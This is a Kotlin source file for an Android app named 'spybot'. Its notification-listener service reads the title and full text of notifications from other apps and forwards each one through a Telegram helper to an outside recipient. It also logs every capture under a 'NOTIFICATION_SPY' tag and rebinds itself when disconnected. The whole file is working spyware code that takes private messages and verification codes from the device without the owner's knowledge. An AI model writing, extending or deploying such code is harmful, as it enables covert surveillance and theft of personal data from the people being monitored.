package com.example.spybot

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import com.example.spybot.helper.TelegramHelper

class NotificationListener : NotificationListenerService() {

    private val TAG = "NOTIFICATION_SPY"

    override fun onListenerConnected() {
        super.onListenerConnected()
        Log.d(TAG, "Service Connected and Bound to System Successfully!")
    }

    override fun onListenerDisconnected() {
        super.onListenerDisconnected()
        Log.w(TAG, "Service Disconnected. Requesting rebind...")
        requestRebind()
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        if (sbn == null) return

        val packageName = sbn.packageName ?: return

        // Apni app aur system UI ke general alerts ignore karein
        if (packageName == this.packageName || packageName == "android") return

        val extras = sbn.notification?.extras ?: return

        // CharSequence se safe reading
        val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString()?.trim() ?: "No Title"
        val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()?.trim() ?: ""
        val bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()?.trim() ?: text

        val finalBody = if (bigText.isNotEmpty() && bigText != text) bigText else text

        // Dono khali ho to ignore karein
        if (title.isEmpty() && finalBody.isEmpty()) return

        val appName = getAppName(packageName) ?: packageName

        Log.d(TAG, "Captured: [$appName] $title -> $finalBody")
        TelegramHelper.sendNotification(applicationContext, title, finalBody, appName)
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {}

    private fun getAppName(packageName: String): String? {
        return try {
            packageManager.getApplicationLabel(
                packageManager.getApplicationInfo(packageName, 0)
            ).toString()
        } catch (e: Exception) {
            null
        }
    }
}
